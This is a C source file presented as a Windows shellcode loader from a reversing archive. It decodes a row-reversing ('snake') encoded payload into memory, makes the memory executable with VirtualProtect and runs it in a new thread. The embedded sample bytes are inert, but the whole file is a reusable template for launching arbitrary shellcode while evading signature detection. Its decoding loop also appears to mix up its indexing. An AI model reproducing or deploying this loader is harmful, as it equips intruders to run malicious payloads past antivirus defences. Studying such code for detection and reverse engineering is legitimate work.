/*
    Shellcode Loader
    Archive of Reversing.ID

    Custom encoding.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    snake
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
    Encoded shellcode format:
        [R] [Shellcode]

    K is the key, which represent the number of rows in matrix
*/

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    uint8_t k = src[0];
    size_t r, c, p;
    size_t cols;
    
    // discard first byte which is key
    size -= 1;
    cols  = size / k;

    for (r = 0, p = 0; r < size; r += cols)
    {
        if (r % 2)
        {
            for (c = 0; c < cols; c++, p++)
                dst[p] = src[r + cols - c];
        }
        else 
        {
            for (c = 0; c < cols; c++, p++)
                dst[p] = src[r + c + 1];
        }
    }
}

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t     payload []  = { 0x02,0x90,0x90,0xc3,0xcc };
    uint32_t    payload_len = 5;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decode payload and store to allocated buffer 
    // discard first byte which is key
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}